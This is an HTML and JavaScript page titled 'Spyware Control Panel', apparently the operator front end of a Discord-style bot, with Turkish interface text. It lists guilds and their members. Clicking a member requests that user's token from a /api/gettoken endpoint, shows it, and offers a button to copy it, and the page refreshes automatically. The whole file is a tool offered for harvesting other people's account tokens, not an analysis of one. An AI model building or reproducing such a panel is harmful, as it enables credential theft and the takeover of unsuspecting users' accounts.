<!DOCTYPE html>
<html>
<head>
    <title>Spyware Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #fff; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #ff00ff; text-align: center; padding: 20px; }
        .guild { background: #1a1a2e; border: 1px solid #ff00ff; border-radius: 10px; padding: 20px; margin: 20px 0; }
        .guild h2 { color: #00ff00; margin-bottom: 10px; }
        .member { display: inline-block; background: #2a2a4e; padding: 10px 15px; margin: 5px; border-radius: 5px; cursor: pointer; border: 1px solid #444; transition: 0.3s; }
        .member:hover { background: #ff00ff; border-color: #ff00ff; }
        .member .tag { color: #fff; }
        .member .id { color: #888; font-size: 12px; }
        .token-box { background: #1a1a2e; border: 1px solid #00ff00; border-radius: 10px; padding: 20px; margin: 20px 0; }
        .token-box textarea { width: 100%; height: 100px; background: #0a0a0a; color: #00ff00; border: none; padding: 10px; font-family: monospace; }
        .refresh-btn { background: #ff00ff; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 0; }
        .refresh-btn:hover { background: #cc00cc; }
        .status { color: #ffff00; text-align: center; }
        .copy-btn { background: #00ff00; color: #000; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 SPYWARE CONTROL PANEL</h1>
        <button class="refresh-btn" onclick="refresh()">🔄 Sunucuları Yenile</button>
        <div id="status" class="status">Bot bekleniyor...</div>
        <div id="guilds"></div>
        
        <div class="token-box" id="tokenBox" style="display:none;">
            <h3>🎯 Seçilen Kullanıcının Token'ı</h3>
            <textarea id="tokenDisplay" readonly></textarea>
            <button class="copy-btn" onclick="copyToken()">📋 Kopyala</button>
        </div>
    </div>

    <script>
        const API_URL = '/api/status';
        let currentData = null;

        async function refresh() {
            document.getElementById('status').innerHTML = '🔄 Yükleniyor...';
            try {
                const res = await fetch(API_URL);
                const data = await res.json();
                currentData = data;
                render(data);
                document.getElementById('status').innerHTML = '✅ Güncellendi: ' + new Date().toLocaleString();
            } catch(e) {
                document.getElementById('status').innerHTML = '❌ Hata: ' + e.message;
            }
        }

        function render(data) {
            const container = document.getElementById('guilds');
            container.innerHTML = '';
            
            if (!data.guilds || data.guilds.length === 0) {
                container.innerHTML = '<p style="color:#888;">Henüz bot bir sunucuda değil...</p>';
                return;
            }

            data.guilds.forEach(guild => {
                const div = document.createElement('div');
                div.className = 'guild';
                div.innerHTML = `<h2>📁 ${guild.name} (${guild.members.length} üye)</h2>`;
                
                guild.members.forEach(member => {
                    const m = document.createElement('div');
                    m.className = 'member';
                    m.innerHTML = `
                        <span class="tag">${member.tag}</span>
                        <span class="id">${member.id}</span>
                    `;
                    m.onclick = () => getToken(guild.id, member.id);
                    div.appendChild(m);
                });
                container.appendChild(div);
            });
        }

        async function getToken(guildId, memberId) {
            const tokenBox = document.getElementById('tokenBox');
            const tokenDisplay = document.getElementById('tokenDisplay');
            tokenBox.style.display = 'block';
            tokenDisplay.value = 'Token alınıyor...';
            
            try {
                const res = await fetch('/api/gettoken', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ guildId, memberId })
                });
                const data = await res.json();
                if (data.token) {
                    tokenDisplay.value = data.token;
                } else {
                    tokenDisplay.value = '❌ Token alınamadı!';
                }
            } catch(e) {
                tokenDisplay.value = '❌ Hata: ' + e.message;
            }
        }

        function copyToken() {
            const text = document.getElementById('tokenDisplay');
            text.select();
            document.execCommand('copy');
            alert('✅ Token kopyalandı!');
        }

        refresh();
        setInterval(refresh, 30000);
    </script>
</body>
</html>
